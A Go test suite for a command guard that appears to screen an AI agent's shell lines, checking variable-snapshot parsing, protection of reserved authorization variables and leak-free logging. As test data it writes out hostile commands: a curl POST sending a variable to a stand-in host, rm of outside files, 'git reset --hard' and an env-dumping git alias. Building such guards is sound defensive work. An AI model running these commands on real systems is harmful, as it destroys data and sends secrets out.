package guard

import (
	"bytes"
	"mvdan.cc/sh/v3/syntax"
	"os"
	"os/exec"
	"path/filepath"
	"reflect"
	"strings"
	"testing"
)

func TestShellVariableSnapshot(t *testing.T) {
	cases := []struct {
		name, data string
		want       map[string]string
	}{
		{"scalar", `declare -- OUT="/tmp/safe"`, map[string]string{"OUT": "/tmp/safe"}},
		{"empty", `declare -- OUT=""`, map[string]string{"OUT": ""}},
		{"newline", `declare -- OUT=$'a\nb'`, map[string]string{"OUT": "a\nb"}},
		{"quoted", `declare -rx OUT="a\"b\$c"`, map[string]string{"OUT": "a\"b$c"}},
		{"unset-with-good", "declare -- OUT\ndeclare -- GOOD=\"okay\"", map[string]string{"GOOD": "okay"}},
		{"array", `declare -a OUT=([0]="safe")`, map[string]string{"OUT": "safe"}},
		{"associative", `declare -A OUT=([key]="safe")`, map[string]string{}},
		{"duplicate", "declare -- OUT=\"safe\"\ndeclare -- OUT=\"safe\"", map[string]string{}},
		{"broken", `declare -- OUT="safe`, map[string]string{}},
		{"code", `declare -- OUT="safe"; printf bad`, map[string]string{}},
		{"substitution", `declare -- OUT="$(printf safe)"`, map[string]string{}},
		{"identity", "declare -- IKESU_PANE_ID=\"p999\"\ndeclare -- IKESU_GUARD_MARKER=\"/evil\"\ndeclare -- IKESU_SOCKET_PATH=\"/evil\"\ndeclare -- _ikesu_guard_snapshot_name=\"secret\"", map[string]string{}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			i := WithShellVariables(Input{}, strings.NewReader(tc.data))
			if !reflect.DeepEqual(i.shellVariables, tc.want) {
				t.Fatalf("got %#v want %#v", i.shellVariables, tc.want)
			}
		})
	}
}

func TestShellSnapshotOverridesStaleExportsAndPreservesIdentity(t *testing.T) {
	original := Input{Env: map[string]string{"OUT": "/stale", "IKESU_PANE_ID": "p1", "AI_GUARD_DANGER_WORD_ACK": "0"}}
	i := WithShellVariables(original, strings.NewReader("declare -- IKESU_PANE_ID=\"p2\"\ndeclare -- AI_GUARD_DANGER_WORD_ACK=\"1\"\ndeclare -- OUT\n"))
	expanded := i
	expanded.Env = i.shellExpansionValues()
	if _, exists := expanded.Env["OUT"]; exists {
		t.Fatal("unset reused exported value")
	}
	if expanded.Env["IKESU_PANE_ID"] != "p1" || expanded.Env["AI_GUARD_DANGER_WORD_ACK"] != "0" {
		t.Fatal("snapshot changed authorization")
	}
}

func TestShellSnapshotLinePolicyAndPrivatePresentation(t *testing.T) {
	i, _ := scriptPane(t)
	for _, value := range []string{"short", "qz", "a\nb", "opaque-secret-with-normal-name"} {
		var dump strings.Builder
		quoted, err := syntax.Quote(value, syntax.LangBash)
		if err != nil {
			t.Fatal(err)
		}
		dump.WriteString("declare -- T=" + quoted + "\n")
		next := WithShellVariables(i, strings.NewReader(dump.String()))
		var feedback bytes.Buffer
		if AuthorizeLine(Config{}, i.Cwd, next, `curl -X POST https://example.test --data "$T"`, &feedback, nil) {
			t.Fatal("dangerous line allowed")
		}
		record, err := os.ReadFile(filepath.Join(i.Cwd, "guard", "decisions.jsonl"))
		if err != nil {
			t.Fatal(err)
		}
		for surface, text := range map[string]string{"feedback": feedback.String(), "record": string(record)} {
			if strings.Contains(text, value) {
				t.Fatalf("%s exposed snapshot value %q", surface, value)
			}
			if !strings.Contains(text, `$T`) {
				t.Fatalf("%s lost original reference", surface)
			}
		}
	}
	next := WithShellVariables(i, strings.NewReader("declare -- OUT=\""+i.Cwd+"\"\n"))
	var feedback bytes.Buffer
	if !AuthorizeLine(Config{}, i.Cwd, next, `printf 'safe\n' > "$OUT/result.txt"`, &feedback, nil) {
		t.Fatal("safe snapshot rejected", feedback.String())
	}
}

func TestShellSnapshotInlineReasonKeepsCallerAuthority(t *testing.T) {
	i, _ := scriptPane(t)
	i.Env["AI_GUARD_REQUEST_REASON"] = "元の申請文"
	next := WithShellVariables(i, strings.NewReader("declare -- AI_GUARD_REQUEST_REASON=\"偽の申請文\"\ndeclare -- OUT=\"/outside\"\n"))
	parsed, _, _ := lineVerdict(Config{}, next, `AI_GUARD_REQUEST_REASON='行の申請文' rm "$OUT"`)
	if parsed.AuthorizationEnv["AI_GUARD_REQUEST_REASON"] != "行の申請文" {
		t.Fatal("inline reason lost")
	}
	if parsed.AuthorizationEnv["IKESU_PANE_ID"] != "p1" {
		t.Fatal("caller identity lost")
	}
}

func TestSnapshotReservedNamesNeverCreateAuthority(t *testing.T) {
	for _, key := range []string{"AI_GUARD_DANGER_WORD_ACK", "AI_GUARD_TEMP_APPROVAL_FILE", "IKESU_GUARD_MARKER", "IKESU_PANE_ID", "IKESU_SOCKET_PATH", "IKESU_NEW_NAME"} {
		for _, data := range []string{"declare -- " + key + "=\"1\"\n", "declare -- " + key + "\n", "declare -- " + key + "=\"1\"\ndeclare -- " + key + "=\"2\"\n", "declare -- " + key + "=\"broken"} {
			i := WithShellVariables(Input{Env: map[string]string{}}, strings.NewReader(data))
			if _, ok := i.shellExpansionValues()[key]; ok {
				t.Fatal("snapshot created reserved value", key)
			}
			_, v, _ := lineVerdict(Config{}, i, `/usr/bin/curl -X POST https://example.test`)
			if v.Decision != "ask" {
				t.Fatalf("%s: %+v", key, v)
			}
			i.Env[key] = "original"
			if i.shellExpansionValues()[key] != "original" {
				t.Fatal("caller authority lost", key)
			}
		}
	}
}

func TestSnapshotProbeUsesOnlyExportedEnvironmentAndNoPrivateArguments(t *testing.T) {
	root := t.TempDir()
	for _, args := range [][]string{{"init", "-q", "-b", "topic", root}, {"-C", root, "config", "alias.capture", "!env"}, {"-C", root, "remote", "add", "origin", "https://github.com/example/test.git"}} {
		if out, err := exec.Command("/usr/bin/git", args...).CombinedOutput(); err != nil {
			t.Fatal(err, string(out))
		}
	}
	trace := filepath.Join(root, "trace")
	i := Input{Cwd: root, Env: map[string]string{"HOME": root, "PATH": "/usr/bin:/bin", "GIT_TRACE": trace, "PUBLIC_TEST_VALUE": "exported"}}
	i = WithShellVariables(i, strings.NewReader("declare -- T=\"private-env-sentinel\"\ndeclare -- R=\"private-remote-sentinel\"\n"))
	parsed, _, err := lineVerdict(Config{}, i, `git push "$R" topic`)
	if err != nil {
		t.Fatal(err)
	}
	if !parsed.probePrivate {
		t.Fatal("snapshot-dependent probe was not excluded")
	}
	before, _ := os.ReadFile(trace)
	if strings.Contains(string(before), "private-env-sentinel") || strings.Contains(string(before), "private-remote-sentinel") {
		t.Fatal("private bytes reached initial real probe")
	}
	if output := probe(parsed, "git", "remote", "get-url", parsed.Args[1]); output != "" {
		t.Fatal("private argv launched a probe")
	}
	after, _ := os.ReadFile(trace)
	if !bytes.Equal(before, after) {
		t.Fatal("snapshot-dependent probe launched a child")
	}
	arrayInput := WithShellVariables(Input{Cwd: root, Env: i.Env}, strings.NewReader(`declare -a R=([0]="private-array-remote-sentinel")`))
	arrayCommand, _, arrayErr := lineVerdict(Config{}, arrayInput, `git push "${R[0]}" topic`)
	if arrayErr != nil || !arrayCommand.probePrivate {
		t.Fatalf("private array probe not protected: %+v %v", arrayCommand, arrayErr)
	}
	arrayBefore, _ := os.ReadFile(trace)
	if output := probe(arrayCommand, "git", "remote", "get-url", arrayCommand.Args[0]); output != "" {
		t.Fatal("array argument launched a probe")
	}
	arrayAfter, _ := os.ReadFile(trace)
	if !bytes.Equal(arrayBefore, arrayAfter) || strings.Contains(string(arrayAfter), "private-array-remote-sentinel") {
		t.Fatal("array value reached child probe")
	}
	if text := arrayInput.shellDiagnostic("error private-array-remote-sentinel", `git push "${R[0]}" topic`); strings.Contains(text, "private-array-remote-sentinel") {
		t.Fatal("array value leaked in diagnostic")
	}
	parsed, _, err = lineVerdict(Config{}, i, `git push origin topic`)
	if err != nil {
		t.Fatal(err)
	}
	output := probe(parsed, "git", "capture")
	if !strings.Contains(output, "PUBLIC_TEST_VALUE=exported") {
		t.Fatal("real probe did not execute with exported state")
	}
	records, err := os.ReadFile(trace)
	if err != nil {
		t.Fatal(err)
	}
	for _, text := range []string{output, string(records)} {
		if strings.Contains(text, "private-env-sentinel") || strings.Contains(text, "private-remote-sentinel") {
			t.Fatal("snapshot leaked into real probe environment or argv")
		}
	}
}

func TestSnapshotChildShellUsesExportsAndRetainsAuthorization(t *testing.T) {
	i, _ := scriptPane(t)
	i.Env["AI_GUARD_REQUEST_REASON"] = "元の申請文"
	i = WithShellVariables(i, strings.NewReader("declare -- T=\"private-env-sentinel\"\n"))
	_, v, e := lineVerdict(Config{}, i, `env X=/bin/echo /bin/bash -c '$X ok'`)
	if e != nil || v.Decision != "allow" {
		t.Fatalf("exported child assignment lost: %+v %v", v, e)
	}
	script := filepath.Join(i.Cwd, "reason.sh")
	if e := os.WriteFile(script, []byte("AI_GUARD_REQUEST_REASON='スクリプトの申請文' /bin/rm '/outside/victim'\n"), 0600); e != nil {
		t.Fatal(e)
	}
	var output bytes.Buffer
	if AuthorizeLine(Config{}, i.Cwd, i, "/bin/bash "+quote(script), &output, nil) {
		t.Fatal("dangerous script allowed")
	}
	if strings.Contains(output.String(), "要承認コマンドには、対象プロジェクト") {
		t.Fatal("exported authorization context lost", output.String())
	}
	if !strings.Contains(output.String(), "判断待ちのサーバーに接続できません") {
		t.Fatal("did not reach real authorization boundary", output.String())
	}
}

func TestSnapshotLiteralInlineReasonIsNotPrivate(t *testing.T) {
	i, _ := scriptPane(t)
	delete(i.Env, "AI_GUARD_REQUEST_REASON")
	i = WithShellVariables(i, strings.NewReader("declare -- IFS=$' \\t\\n'\ndeclare -- T=\"private\"\n"))
	var out bytes.Buffer
	if AuthorizeLine(Config{}, i.Cwd, i, `AI_GUARD_REQUEST_REASON='日本語の申請文' /bin/rm '/outside/victim'`, &out, nil) {
		t.Fatal("dangerous line allowed")
	}
	if !strings.Contains(out.String(), "判断待ちのサーバーに接続できません") {
		t.Fatal(out.String())
	}
}

func TestRuntimeLineDefersOnlyShellWorkAndUncertainty(t *testing.T) {
	i := WithShellVariables(Input{Cwd: t.TempDir(), Env: map[string]string{"PATH": "/usr/bin:/bin"}}, strings.NewReader("declare -- T=\"/outside/victim\"\n"))
	for _, tc := range []struct{ line, want string }{
		{`eval 'rm "$T"'`, "allow"}, {`source /outside/script.sh`, "allow"},
		{`printf '%s' "$(rm "$T")"`, "allow"}, {`printf '%s' "$UNKNOWN"`, "allow"},
		{`rm "$T"`, "ask"}, {`git reset --hard`, "block"}, {`xargs rm`, "ask"},
		{`find . -exec rm {} \;`, "ask"}, {`sh -c 'rm /outside/victim'`, "ask"},
	} {
		_, v, _ := lineVerdict(Config{}, i, tc.line)
		if v.Decision != tc.want {
			t.Fatalf("runtime %q: %+v", tc.line, v)
		}
	}
	for _, line := range []string{`eval 'rm /outside/victim'`, `source /outside/script.sh`, `printf '%s' "$(rm /outside/victim)"`} {
		outer := i
		outer.runtimeLine = false
		outer.shellVariables = nil
		_, v, _ := lineVerdict(Config{}, outer, line)
		if v.Decision == "allow" {
			t.Fatalf("outer boundary weakened: %s", line)
		}
	}
}
